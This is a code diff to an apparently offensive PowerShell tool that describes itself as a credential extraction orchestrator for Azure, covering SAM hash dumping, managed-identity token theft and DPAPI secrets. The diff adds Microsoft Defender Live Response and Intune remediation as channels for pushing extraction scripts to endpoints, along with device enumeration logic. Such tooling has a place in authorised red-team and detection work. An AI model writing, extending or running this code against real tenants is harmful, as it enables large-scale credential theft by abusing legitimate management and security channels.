@@ -747,6 +747,40 @@ function Invoke-SAMExtraction {
                 -MachineName $Target.Name `
                 -RunCommandName $runCommandName `
                 -ErrorAction SilentlyContinue
+
+        } elseif ($Target.Type -eq "MDEDevice") {
+            # MDE Live Response execution
+            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
+
+            $mdeResult = Invoke-MDELiveResponse `
+                -MachineId $Target.MDEMachineId `
+                -Command $script `
+                -AccessToken $Target.MDEToken `
+                -Timeout $Timeout
+
+            if ($mdeResult.Status -eq "Success") {
+                $output = $mdeResult.Output
+            } else {
+                throw "MDE Live Response failed: $($mdeResult.Output)"
+            }
+
+        } elseif ($Target.Type -eq "IntuneDevice") {
+            # Intune Proactive Remediation execution
+            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
+
+            $intuneResult = Invoke-IntuneRemediation `
+                -DeviceId $Target.IntuneDeviceId `
+                -Command $script `
+                -PowerShell:$true `
+                -DeviceName $Target.Name
+
+            if ($intuneResult.Status -eq "Triggered") {
+                # Intune is async - no immediate output
+                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
+                $result.Error = "Intune extraction is async-only - check Intune portal for results"
+            } else {
+                throw "Intune Remediation failed: $($intuneResult.Output)"
+            }
         }
 
         # Clean up output
@@ -878,6 +912,40 @@ echo "---SUCCESS---"
                 -MachineName $Target.Name `
                 -RunCommandName $runCommandName `
                 -ErrorAction SilentlyContinue
+
+        } elseif ($Target.Type -eq "MDEDevice") {
+            # MDE Live Response execution
+            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
+
+            $mdeResult = Invoke-MDELiveResponse `
+                -MachineId $Target.MDEMachineId `
+                -Command $script `
+                -AccessToken $Target.MDEToken `
+                -Timeout $Timeout
+
+            if ($mdeResult.Status -eq "Success") {
+                $output = $mdeResult.Output
+            } else {
+                throw "MDE Live Response failed: $($mdeResult.Output)"
+            }
+
+        } elseif ($Target.Type -eq "IntuneDevice") {
+            # Intune Proactive Remediation execution
+            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
+
+            $intuneResult = Invoke-IntuneRemediation `
+                -DeviceId $Target.IntuneDeviceId `
+                -Command $script `
+                -PowerShell:$true `
+                -DeviceName $Target.Name
+
+            if ($intuneResult.Status -eq "Triggered") {
+                # Intune is async - no immediate output
+                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
+                $result.Error = "Intune extraction is async-only - check Intune portal for results"
+            } else {
+                throw "Intune Remediation failed: $($intuneResult.Output)"
+            }
         }
 
         # Clean up output
@@ -990,6 +1058,40 @@ function Invoke-DPAPIExtraction {
                 -MachineName $Target.Name `
                 -RunCommandName $runCommandName `
                 -ErrorAction SilentlyContinue
+
+        } elseif ($Target.Type -eq "MDEDevice") {
+            # MDE Live Response execution
+            Write-ColorOutput -Message "    [*] Using MDE Live Response (async)..." -Color "Cyan"
+
+            $mdeResult = Invoke-MDELiveResponse `
+                -MachineId $Target.MDEMachineId `
+                -Command $script `
+                -AccessToken $Target.MDEToken `
+                -Timeout $Timeout
+
+            if ($mdeResult.Status -eq "Success") {
+                $output = $mdeResult.Output
+            } else {
+                throw "MDE Live Response failed: $($mdeResult.Output)"
+            }
+
+        } elseif ($Target.Type -eq "IntuneDevice") {
+            # Intune Proactive Remediation execution
+            Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation (async)..." -Color "Cyan"
+
+            $intuneResult = Invoke-IntuneRemediation `
+                -DeviceId $Target.IntuneDeviceId `
+                -Command $script `
+                -PowerShell:$true `
+                -DeviceName $Target.Name
+
+            if ($intuneResult.Status -eq "Triggered") {
+                # Intune is async - no immediate output
+                $output = "---INTUNE_ASYNC---`nScript deployed to $($Target.Name). Check Intune portal for output."
+                $result.Error = "Intune extraction is async-only - check Intune portal for results"
+            } else {
+                throw "Intune Remediation failed: $($intuneResult.Output)"
+            }
         }
 
         # Clean up output
@@ -1022,16 +1124,23 @@ function Invoke-DPAPIExtraction {
 .SYNOPSIS
     Main credential extraction orchestrator (Azure equivalent of NetExec --sam).
 .DESCRIPTION
-    Coordinates credential extraction across Azure VMs and Arc devices.
+    Coordinates credential extraction across Azure VMs, Arc devices, MDE devices, and Intune devices.
     Supports SAM hash dumping, Managed Identity token extraction, and DPAPI secrets.
+
+    Execution Methods:
+    - vmrun: Azure VM Run Command (sync)
+    - arc: Arc Run Command (sync)
+    - mde: MDE Live Response (async with polling)
+    - intune: Intune Proactive Remediation (async, portal output only)
+    - auto: Tries Arc, then MDE, then Intune based on device type
 .PARAMETER VMName
     Target a specific Azure VM by name.
 .PARAMETER AllVMs
     Target all Azure VMs.
 .PARAMETER DeviceName
-    Target a specific Arc device by name.
+    Target a specific device by name (Arc, MDE, or Intune).
 .PARAMETER AllDevices
-    Target all Arc devices.
+    Target all devices.
 .PARAMETER ResourceGroup
     Filter by resource group.
 .PARAMETER SubscriptionId
@@ -1048,6 +1157,8 @@ function Invoke-DPAPIExtraction {
     Execution timeout in seconds.
 .PARAMETER ExportPath
     Path to export results.
+.PARAMETER ExecMethod
+    Execution method: auto, vmrun, arc, mde, intune. Default is auto.
 #>
 function Invoke-CredentialExtraction {
     param(
@@ -1086,7 +1197,11 @@ function Invoke-CredentialExtraction {
         [int]$Timeout = 300,
 
         [Parameter(Mandatory = $false)]
-        [string]$ExportPath
+        [string]$ExportPath,
+
+        [Parameter(Mandatory = $false)]
+        [ValidateSet("auto", "vmrun", "arc", "mde", "intune")]
+        [string]$ExecMethod = "auto"
     )
 
     # Show banner
@@ -1194,6 +1309,70 @@ function Invoke-CredentialExtraction {
                     Location = $arc.Location
                 }
             }
+        }
+    }
+
+    # MDE Devices (when using -DeviceName or -AllDevices with MDE method)
+    if (($DeviceName -or $AllDevices) -and $ExecMethod -in @("mde", "auto")) {
+        Write-ColorOutput -Message "[*] Enumerating MDE devices..." -Color "Yellow"
+
+        try {
+            $mdeToken = Get-MDEAccessToken
+            if ($mdeToken) {
+                if ($DeviceName) {
+                    # Single device lookup
+                    $mdeDevice = Get-MDEDevice -DeviceName $DeviceName -AccessToken $mdeToken
+                    if ($mdeDevice) {
+                        $dedupeKey = "$($mdeDevice.computerDnsName)|MDE|$($mdeDevice.id)"
+                        if (-not $seenTargets.ContainsKey($dedupeKey)) {
+                            $seenTargets[$dedupeKey] = $true
+                            $targets += [PSCustomObject]@{
+                                Name = $mdeDevice.computerDnsName
+                                Type = "MDEDevice"
+                                ResourceGroup = "MDE"
+                                Subscription = "MDE"
+                                SubscriptionId = $null
+                                OSType = if ($mdeDevice.osPlatform -match "Windows") { "Windows" } else { "Linux" }
+                                Location = $mdeDevice.rbacGroupName
+                                MDEMachineId = $mdeDevice.id
+                                MDEToken = $mdeToken
+                            }
+                        }
+                    }
+                }
+                # Note: AllDevices for MDE would require listing all machines - typically too many
+            }
+        } catch {
+            Write-ColorOutput -Message "[!] MDE enumeration failed: $($_.Exception.Message)" -Color "Red"
+        }
+    }
+
+    # Intune Devices (when using -DeviceName or -AllDevices with Intune method)
+    if (($DeviceName -or $AllDevices) -and $ExecMethod -in @("intune", "auto")) {
+        Write-ColorOutput -Message "[*] Enumerating Intune devices..." -Color "Yellow"
+
+        try {
+            if ($DeviceName) {
+                $intuneDevice = Get-IntuneDevice -DeviceName $DeviceName
+                if ($intuneDevice) {
+                    $dedupeKey = "$($intuneDevice.deviceName)|Intune|$($intuneDevice.id)"
+                    if (-not $seenTargets.ContainsKey($dedupeKey)) {
+                        $seenTargets[$dedupeKey] = $true
+                        $targets += [PSCustomObject]@{
+                            Name = $intuneDevice.deviceName
+                            Type = "IntuneDevice"
+                            ResourceGroup = "Intune"
+                            Subscription = "Intune"
+                            SubscriptionId = $null
+                            OSType = if ($intuneDevice.operatingSystem -match "Windows") { "Windows" } else { "Linux" }
+                            Location = "Intune"
+                            IntuneDeviceId = $intuneDevice.id
+                        }
+                    }
+                }
+            }
+        } catch {
+            Write-ColorOutput -Message "[!] Intune enumeration failed: $($_.Exception.Message)" -Color "Red"
         }
     }
 
